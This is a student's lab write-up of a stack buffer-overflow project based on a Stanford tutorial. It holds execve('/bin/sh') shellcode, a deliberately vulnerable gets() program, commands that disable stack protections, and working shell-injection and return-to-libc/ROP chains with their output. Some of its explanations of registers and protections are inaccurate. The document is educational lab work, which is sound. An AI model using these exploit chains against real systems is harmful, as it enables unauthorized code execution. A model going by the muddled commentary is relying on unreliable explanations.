# Code Injection #
## Eun Il Kim

This project is based on the tutorial provided by Ben Lynn from Stanford University, at: https://crypto.stanford.edu/~blynn/rop/

### What is this repository for? ###

* This is purely for educational purposes and to understand the mechanism behind code injection.

## The Shell Game
1. needle0 jumps to address there
2. there pushes the address below there and jumps to here
3. here places the address below there into rdi
4. clears the rax register
5. stores the program the that filename points to into the lower register of RAX
6. clears the rsi and rdx registers
7. then returns the value of RAX
8. then .string will allocate space for "/bin/sh\" in memory
9. Finally needle1 will create a 16 byte space for 0xdeadbeef register

### shell.c
```
int main() {
  asm("\
needle0: jmp there\n\
here:    pop %rdi\n\
         xor %rax, %rax\n\
         movb $0x3b, %al\n\
         xor %rsi, %rsi\n\
         xor %rdx, %rdx\n\
         syscall\n\
there:   call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
  ");
}
```
Then we run a disassembler to see the address jumps and register values

```
$ objdump -d a.out | sed -n '/needle0/,/needle1/p'
0000000000400478 <needle0>:
  400478:       eb 0e                   jmp    400488 <there>

000000000040047a <here>:
  40047a:       5f                      pop    %rdi
  40047b:       48 31 c0                xor    %rax,%rax
  40047e:       b0 3b                   mov    $0x3b,%al
  400480:       48 31 f6                xor    %rsi,%rsi
  400483:       48 31 d2                xor    %rdx,%rdx
  400486:       0f 05                   syscall

0000000000400488 <there>:
  400488:       e8 ed ff ff ff          callq  40047a <here>
  40048d:       2f                      (bad)
  40048e:       62                      (bad)
  40048f:       69 6e 2f 73 68 00 ef    imul   $0xef006873,0x2f(%rsi),%ebp

0000000000400495 <needle1>:
```

The code starts at offset 0x478 and finishes right before offset 0x495.
```
$ xxd -s0x478 -l32 -p a.out shellcode
```
we get the instruction (between register 0x478 and 0x495 of length 32) starting from register 0x478
```
$ cat shellcode
eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
bead
```

## The Three Trials of Code Injection
#### In this section we will be bypassing the following stack-smaching protections:
1. GCC Stack-Smashing Protector (SSP): If there is some change in secret value of stack it will indicate stack buffer overflow
2. Executable space protection (NX): Makes memory locations non-executable
3. Address Space Layout Randomization (ASLR): Randomizes location of stack preventing manipulation

### victim.c
We are planning to do an overflow in the char name buffer with a long string and overwrite the return address and print the buffer location
```
#include <stdio.h>
int main() {
  char name[64];
  printf("%p\n", name);  // Print address of buffer.
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
```
We disable SSP, while disabling a warning was returned regarding to the danger of buffer overflow:
```
$ gcc -fno-stack-protector -o victim victim.c
/tmp/ccEPLB4U.o: In function `main':
victim.c:(.text+0x1a): warning: the `gets' function is dangerous and should not be used.
```
Disable NX:
```
$ execstack -s victim
```
Disable ASLR when running the binary:
```
$ setarch `arch` -R ./victim
0x7fffffffe370
What's your name?
World
Hello, World!
```
We then print the 16 bytes address in little-endian
```
$ a=`printf %016x  0x7fffffffe370 | tac -rs..`
$ echo $a
73efffffff7f0000
```
For some reason Executable space protection (NX) was not disabled, most likely because I ran this code two times.  
I will try to diable NX again and run it  
![error1](https://bytebucket.org/eunik/comp_security_480_project2/raw/dc0dbc64f0842bcf28a1e3a8a77573c9343d0f18/error1.PNG?token=2db79f2acb95de48c93f4b2ce5f36072882901ad)

It actually turned out that that I was pointing to the wrong stack address before.  
The one below is now correct
```
$ a=`printf %016x 0x7fffffffeab0 | tac -rs..`
$ echo $a
b0eaffffff7f0000
```
The code below will first print out the content of the shellcode file, along with 40 bytes of 0, and $a variable in endian-form 
This hexdump will then be reversed and overwrite the RBP register with 8-bytes of 0, the 32-bytes of 0 on the rest of the buffer  
That means that the return address will then point to the beginning of our shellcode. That is the name buffer.  
The commandline will now allow code injection such as our example below with cat.  
```
$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) | setarch `arch` -R ./victim

0x7fffffffeab0
What's your name?
World
Hello, ▒_H1▒▒;H1▒H1▒▒▒▒▒▒/bin/sh!

ls
a.out  shell.c  shellcode  victim  victim.c
```
## The Importance of Being Patched ##
Check out the cmd and esp
```
$ ps -eo cmd,esp
CMD                              ESP
/sbin/init                  00000000
[kthreadd]                  00000000
[migration/0]               00000000
[ksoftirqd/0]               00000000
[migration/0]               00000000
[watchdog/0]                00000000
[migration/1]               00000000
[migration/1]               00000000
[ksoftirqd/1]               00000000
[watchdog/1]                00000000
[migration/2]               00000000
...
```
Check the ESP of victim
```
$ ps -o cmd,esp -C victim
CMD                              ESP
./victim                    00000000
```
The code above was not helpful as we cannot find out the random address of our name buffer.  
The reason for this is because the newer systems counteract the ability to determine the buffer address.  
Therefore we run again at an older system  
```
$ ps -o cmd,esp -C victim
CMD                              ESP
./victim                    ffffe318
```
The distance between the stack pointer 0x7fffffe038 to the pointer of the name buffer 
```
$ echo $((0x7fffffea90-0x7fffffea38))
88
```
We then run without the ASLR Protection  
We can still beat the old protection by offseting the current random name buffer by 88
```
$ ./victim
$ ps -o cmd,esp -C victim
./victim           32a3c125
$ printf %x\\n $((0x7fff32a3c125+88))
7fff32a3c17d
```
Then this creates a fifo (named file) that allows read or write access
```
$ mkfifo pip
$ cat pip | ./victim
0x7fffdc884950
What's your name?
World
Hello, ▒_H1▒▒;H1▒H1▒▒▒▒▒▒/bin/sh!
pip a.out  shell.c  shellcode  victim  victim.c
```
We then run in another terminal and used its stack pointer to inject code. 
It is just like the pip example above
```
$ sp=`ps --no-header -C victim -o esp`
$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;
cat ) > pip
ls
pip a.out  shell.c  shellcode  victim  victim.c
```

## Executable space perversion
First we try to run the code without a NX disabler
```
$ sp=`ps --no-header -C victim -o esp`
$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
What's your name?
World
Hello, ▒_H1▒▒;H1▒H1▒▒▒▒▒▒/bin/sh!
Segmentation fault (core dumped)
```
Then on another terminal we run the following:
```
$ sp=`ps --no-header -C victim -o esp`
$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) > pip

ls
```
We were able to do the same thing as the previous example with jumping to the
stack pointer at the name buffer by offsetting the current random stackpointer.  
We then tried to run the code injected insde the name buffer, but we weren't able to execute them.

## Go go gadgets
In order to overcome the situation above we try to overwrite RET instead.  
We want to overwrite RET to the address of code that is actually executable.  
In order to pull it off we must be aware that SP increments by 8, and the RET points to SP  
So we must modify address on SP to the code we want to excute.
```
$ locate libc.so
/lib/x86_64-linux-gnu/libc.so.6
/usr/lib/x86_64-linux-gnu/libc.so
/var/tmp/mkinitramfs_yR2G7t/lib/x86_64-linux-gnu/libc.so.6
```
Then we find available gadgets, as this returns a long list it will not be displayed below:
```
$ objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret
```
We are only interested in the instruction that assigns the pointer to the RDI. 
so we try to search codes that we are interested in, we want to execute something similar to the code below
```
pop  %rdi
retq
```
So to get around it we run the following
```
$ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 |grep 5f -m1 | awk '{printf"%x\n",$1-1}'
21102
```
We first grab all the lines from the library file from 1 to the offset which is at 0.  
As all indexes follow 0 -> n-1, we subtract 1.  
We read one hexcode per line and look for 0xC3 (which might be the opcode for ret)  
If found, we print whichever lines matches what we are searching for
Then we look for the "0x5F" (which might be RDI register) and also print out the line. 

## Many happy returns
Now that we have the address location for the opcode of RET and the address for RDI register we now try the following:
#### Overwrite the return address to run the following:
1. address of gadget: libc's address + 0x21102
2. address of "bin/sh": 
3. address of libc's system() function
We first run the following:
```
$ setarch `arch` -R ./victim
```
Then we try to find the address of the gadget by finding the address of libc.  
All this is ran at another terminal meanwhile:
```
$ grep libc /proc/$pid/maps
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 52900                      /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 52900                      /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r-xp 001c0000 08:01 52900                      /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rwxp 001c4000 08:01 52900                      /lib/x86_64-linux-gnu/libc-2.23.so
```
We then calculated that the gadget address was:  
$0x7FFFF7A2E102 = 0x7ffff7a0d000 + 0x21102.  
Then we proceed to find the address of "/bin/sh", this was already done so with the value of: 0x7fffffffdff0.  
Then we find address of libcs system function  
```
$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
0000000000045390 W system
```
Finally we calculate the address of the libc's system function which is
$7FFFF7A52390 = 0x7ffff7a0d000 + 0x45390.  
Then we try to overcome the NX protection by running our own RET
```
$ (echo -n /bin/sh | xxd -p; printf %0130d 0;
printf %016x $((0x7ffff7a0d000+0x21102)) | tac -rs..;
printf %016x 0x7fffffffdff0 | tac -rs..;
printf %016x $((0x7ffff7a0d000+0x45390)) | tac -rs..) |
xxd -r -p | setarch `arch` -R ./victim
0x7fffffffdff0
What's your name?
World
Hello, ▒_H1▒▒;H1▒H1▒▒▒▒▒▒/bin/sh!
Segmentation fault
```
We weren't able to run the code due to segmentation error.  
So we tried following the original link guide: https://github.com/finallyjustice/security/blob/master/rop/demo1/README.txt.  
libc base address: 0x7ffff7a0d000.  
gadget address: 0x7FFFF7A2E102 = 0x7ffff7a0d000 + 0x21102.  
buffer address: 0x7fffffffdff0.  
buffer + offset: = 0x7FFFFFFFE050 = 0x7fffffffdff0 + 64 + 8 + 24.  
system address: 0x7FFFF7A52390= 0x7ffff7a0d000 + 0x45390.  
```
$ ((( printf %0144d 0; 
printf %016x 0x7FFFF7A2E102 | tac -rs..;
printf %016x 0x7FFFFFFFE050 | tac -rs..;
printf %016x 0x7FFFF7A52390 | tac -rs..;
echo -n /bin/sh | xxd -p) | xxd -r -p) ;
cat ) | setarch `arch` -R ./victim
0x7fffffffdff0
What's your name?
World
Hello, !

ls
pip a.out  shell.c  shellcode  victim  victim.c
```
We fill the buffer with 130 0s, which is 65 zero bytes. By doing so,
it allows us to overwrite beyond the buffer, the "/bin/sh", and when RBP was being pushed to the stack.  
This will allows us to overwrite RBP with the address of "/bin/sh".  
So when RBP was popped, it saved address of "/bin/sh" and then jumped to the address of the system()
to execute "/bin/sh", which has our injection.  
